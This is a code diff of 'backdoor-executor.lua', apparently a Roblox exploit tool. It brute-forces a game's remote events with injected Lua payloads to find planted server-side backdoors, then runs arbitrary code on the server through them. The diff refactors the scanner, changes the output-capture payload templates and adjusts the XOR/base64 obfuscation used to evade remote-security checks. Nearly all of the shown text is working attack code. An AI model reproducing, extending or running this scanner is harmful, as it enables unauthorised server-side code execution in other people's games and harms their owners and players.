@@ -9,29 +9,8 @@ local starterGui = game:GetService("StarterGui")
 local config
 local execGuiAPI
 local remoteRedirectionInitialized = false
-local debugSource = [[
-local stdout = table.create(512)
-local execSucc, result do
-	local env = getfenv(0)
-	env.print = function(...)
-		table.insert(stdout, {0, workspace:GetServerTimeNow(), ...})
-	end
-	env.warn = function(...)
-		table.insert(stdout, {1, workspace:GetServerTimeNow(), ...})
-	end
-	local function main() %s end
-
-	execSucc, result = pcall(setfenv(main, env))
-end
-
-local stdObj = Instance.new("BoolValue")
-stdObj.Name, stdObj.Value, stdObj.Parent = "%s", execSucc, game:GetService("InsertService")
-
-stdObj:SetAttribute("stderr", (not execSucc and result or nil))
-stdObj:SetAttribute("stdout", (#stdout > 0 and game:GetService("HttpService"):JSONEncode(stdout) or nil))
-task.delay(1, stdObj.Destroy, stdObj)
-]]
-local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s|%s");c(5,b,a,d,nil)]]
+local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv(0)h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),b(...)})end;f,g=pcall(setfenv(main,h))end;local i=Instance.new("BoolValue")i.Name,i.Value,i.Parent="%s",f,game:GetService("InsertService")i:SetAttribute("stderr",not f and g or nil)i:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,i.Destroy,i)]]
+local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s");c(5,b,a,d,nil)]]
 local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
 local remoteInfo = {
 	["foundBackdoor"] = false,
@@ -49,7 +28,7 @@ local msgOutputs = {
 	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
 	["failedRemoteRedirection"] = "Remote redirection failed to load, using original remote.",
 	["printRemote"] = "\n Remote: %s | [%s]\n Type: %s",
-	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: https://github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
+	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
 }
 local stringifiedTypes = {
 	EnumItem = function(value)
@@ -93,7 +72,7 @@ end
 
 local function sendNotification(text)
 	return starterGui:SetCore("SendNotification", {
-		Title = "[backdoor-executor v2]",
+		Title = "[jLn0n's beckdeer skeener]",
 		Text = text,
 		Duration = 5
 	})
@@ -137,9 +116,14 @@ local function pathToInstance(strPath)
 	end
 	local result = game
 
-	for _, pathName in subPaths do
+	for index, pathName in subPaths do
 		if not result then return end
-		result = result:WaitForChild(pathName, 1) -- yielding go brr
+		result = (
+			if index == 1 then
+				game:GetService(pathName)
+			else
+				result:WaitForChild(pathName, 1)
+		)
 	end
 	return result
 end
@@ -230,7 +214,7 @@ local function applyMacros(source)
 			else
 				macroValue
 		)
-		source = string.gsub(source, "%%" .. macroName .. "%%", macroValue)
+		source = string.gsub(source, `%%{macroName}%%`, macroValue)
 	end
 	return source
 end
@@ -253,12 +237,12 @@ local applyRedirectedRemoteSecurity do
 
 		for idx = 1, #source do
 			local charByte = string.byte(source, idx, idx)
-			local offset = ((idx % randomObj:NextInteger(0, 96)) + randomObj:NextInteger(0, 16))
+			local offset = ((idx % randomObj:NextInteger(0, 128)) + randomObj:NextInteger(0, 32))
 			charByte = bit32.bxor(offset, charByte, randomObj:NextInteger(0, 16))
 
 			result ..= string.char(charByte)
 		end
-		result = string.gsub(result, ".", function(value) return "\\" .. string.byte(value) end)
+		result = string.gsub(result, ".", function(value) return string.format("%02X", string.byte(value)) end)
 		return result
 	end
 
@@ -280,7 +264,7 @@ local applyRedirectedRemoteSecurity do
 		generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
 		generatedArgs[srcArgIdx] = crypt.base64encode(XORSource(source, XORKey))
 		generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
-		generatedArgs[nonceIdx] = "\127@" .. generateRandString(randIdx + argsLenght) -- generates a nonce that is the lenght of `randIdx`
+		generatedArgs[nonceIdx] = `\127@{generateRandString(randIdx + argsLenght)}` -- generates a nonce that is the lenght of `randIdx`
 
 		for argIndex = 2, argsLenght do -- inserts random jibberish
 			if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
@@ -319,13 +303,16 @@ local function execScript(source, noRedirectOutput)
 						Enum.MessageType.MessageWarning
 					else nil
 				), output[2]
-				output = table.concat(output, " ", 3)
+				local outputMsg = ""
+				for _, value in output[3] do
+					outputMsg ..= `{tostring(value) or "nil"} `
+				end
 
-				execGuiAPI.console.createOutput(output, outputType, timestamp)
+				execGuiAPI.console.createOutput(outputMsg, outputType, timestamp)
 			end
 
 			if not object.Value then
-				execGuiAPI.console.createOutput(object:GetAttribute("stderr"), Enum.MessageType.MessageError)
+				execGuiAPI.console.createOutput(object:GetAttribute("stderr") or "Error occured, no output from Lua.", Enum.MessageType.MessageError)
 			end
 		end)
 		task.delay(60, connection.Disconnect, connection)
@@ -411,26 +398,8 @@ local function onAttached(remoteInfoParams)
 	end
 end
 
-local function scanBackdoors()
-	if remoteInfo.foundBackdoor then return end
-	local remotesList = getRemotes()
-	local nonce = generateRandString(32, true)
-
-	local connection;
-	connection = logService.AttributeChanged:Connect(function(attributeName)
-		if attributeName ~= nonce then return end connection:Disconnect()
-		local remoteResult = string.split(logService:GetAttribute(nonce), "|")
-		local remoteObj = remotesList[remoteResult[1]]
-		local payloadInfo = config.backdoorPayloads[remoteResult[2]]
-
-		task.spawn(onAttached, {
-			["instance"] = remoteObj,
-			["args"] = payloadInfo.Args,
-			["argSrcIndex"] = table.find(payloadInfo.Args, "source")
-		})
-	end)
-
-	local function testRemote(remoteObj, remoteObjId)
+local scanBackdoors do
+	local function testRemote(nonce, remoteObj, remoteObjId)
 		local remoteObjFunc = getRemoteFunc(remoteObj)
 
 		for payloadName, payloadInfo in config.backdoorPayloads do runService.Heartbeat:Wait()
@@ -441,7 +410,7 @@ local function scanBackdoors()
 			local argSrcIdx = table.find(currentPayload, "source")
 			if not argSrcIdx then continue end
 
-			currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, remoteObjId, payloadName)
+			currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, `{remoteObjId}|{payloadName}`)
 			pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
 		end
 		-- this attempts to parent the remote to replicatedstorage if remote is parented to nil
@@ -455,15 +424,35 @@ local function scanBackdoors()
 		end
 	end
 
-	for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
-		if remoteInfo.foundBackdoor then break end
+	function scanBackdoors()
+		if remoteInfo.foundBackdoor then return end
+		local remotesList = getRemotes()
+		local nonce = generateRandString(32, true)
 
-		print(string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
-		task.spawn(testRemote, remoteObj, remoteObjId)
+		local connection;
+		connection = logService.AttributeChanged:Connect(function(attributeName)
+			if attributeName ~= nonce then return end connection:Disconnect()
+			local remoteResult = string.split(logService:GetAttribute(nonce), "|")
+			local remoteObj = remotesList[remoteResult[1]]
+			local payloadInfo = config.backdoorPayloads[remoteResult[2]]
+
+			task.spawn(onAttached, {
+				["instance"] = remoteObj,
+				["args"] = payloadInfo.Args,
+				["argSrcIndex"] = table.find(payloadInfo.Args, "source")
+			})
+		end)
+
+		for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
+			if remoteInfo.foundBackdoor then break end
+
+			print(string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
+			task.spawn(testRemote, nonce, remoteObj, remoteObjId)
+		end
+
+		waitUntil(2.5, function() return not connection.Connected end)
+		task.defer(connection.Disconnect, connection)
 	end
-
-	waitUntil(2.5, function() return not connection.Connected end)
-	task.defer(connection.Disconnect, connection)
 end
 -- main
 do -- config initialization
@@ -501,7 +490,7 @@ do -- backdoor finding
 		if placeCacheData then
 			local successCount = 0
 			local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Path) else placeCacheData.Path)
-			local argSrcIndex = (typeof(placeCacheData.Args) == "table" and table.find(placeCacheData.Args, "source"))
+			local argSrcIndex = (if typeof(placeCacheData.Args) == "table" then table.find(placeCacheData.Args, "source") else nil)
 
 			successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
 			successCount += (if (successCount == 1 and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
@@ -517,7 +506,8 @@ do -- backdoor finding
 			else
 				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
 			end
-		else
+		end
+		if not remoteInfo.foundBackdoor then
 			local startTime = os.clock()
 
 			sendNotification("Press F9 to see the remotes being scanned.")
